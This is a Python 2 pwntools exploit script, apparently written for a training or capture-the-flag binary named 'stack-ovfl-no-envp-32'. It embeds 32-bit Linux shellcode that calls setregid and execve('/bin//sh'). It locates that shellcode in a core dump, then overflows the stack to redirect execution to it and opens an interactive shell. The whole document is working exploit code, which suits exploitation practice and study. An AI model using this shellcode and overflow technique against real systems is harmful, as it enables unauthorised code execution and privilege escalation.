#!/usr/bin/env python

from pwn import *

context.terminal = "/bin/bash"

myargv = ['./stack-ovfl-no-envp-32',
        'j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2Qhn/shh//bi\x89\xe3j\x0bX\xcd\x80'
]
buf = 'B' * 0x200
env = { 'SHELLCODE' : "\x90" * 500}

p = process(myargv, env=env)

p.sendline(buf)


c = Core('./core')
shellcode = c.stack.find('j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2Qhn/shh//bi\x89\xe3j\x0bX\xcd\x80')
stack_addr = p32(0xffffdbcc)
print "My shellcode: "
print shellcode
print "    "
print p32(shellcode)
#buf = 'AAAA'

#stack_addr = c.stack.find(buf)

buf = 'AAAA' + p32(shellcode)+ 'CCCC' + p32(shellcode) + p32(shellcode)

p = process(myargv, env=env)
#gdb.attach(p)
p.sendline(buf)
p.interactive()
